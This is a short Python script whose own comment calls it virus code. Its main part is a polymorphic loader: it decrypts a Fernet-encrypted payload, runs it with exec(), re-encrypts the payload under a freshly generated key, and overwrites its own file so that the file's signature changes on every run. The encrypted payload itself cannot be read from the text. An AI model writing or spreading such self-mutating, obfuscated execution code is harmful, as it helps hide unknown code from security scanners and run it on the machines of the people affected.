import inspect
import os
from cryptography.fernet import Fernet
import hashlib

# ---------------------------------------------------------------------------
# Getting file Hash Unrelated to the virus code
def hash_file(filename):
    h = hashlib.sha1()
    with open(filename, 'rb') as file:
        chunk = 0
        while chunk != b'':
            chunk = file.read(1024)
            h.update(chunk)

    return h.hexdigest()

message = hash_file(os.path.basename(__file__))
print("Hash of the file is: ", message)
# End of Hash Code
# ---------------------------------------------------------------------------


def decrypt(token, key):
    fer = Fernet(key)
    decrypted_code = fer.decrypt(token).decode()  
    exec(decrypted_code)  


def encrypt_file_content(filename, key):
    with open(filename, 'r') as f:
        file_content = f.read()
    fer = Fernet(key)
    encrypted_content = fer.encrypt(file_content.encode())
    return encrypted_content

def run():
    global key
    global sql_token


    fname = os.path.basename(__file__)
    lines = []
    with open(fname, 'r') as f:
        lines = f.readlines()
    
    with open('lol', 'w') as f:
        for line in lines:
            if line.startswith("# START"):
                break
            f.write(line)

        f.write("# START\n")

        fer = Fernet(key)
        virus = fer.decrypt(sql_token.encode()).decode()

        key = Fernet.generate_key()
        fer = Fernet(key)
        token = fer.encrypt(virus.encode())
    
        f.write("key = \"{}\"\n".format(key.decode()))
        f.write("sql_token = \"{}\"\n".format(token.decode()))
        f.write("run()")
        decrypt(token, key)
    
    os.remove(fname)
    os.rename("lol", fname)

# START
key = "Z6fducFg1J4wLJi_R6WJrW_mb_52xUyYRQ4vGRQtgLc="
sql_token = "gAAAAABnHnGPMUIoPJJuzn4yAfa_bGHCESf_uW1WhyvO7q-AP3k5JYEpLvM3_e6BmpdwsBpUaCH26MF4TZpkwklkfXV2lGU_FZaqxj8wBB5H7UOoapK1fU4="
run()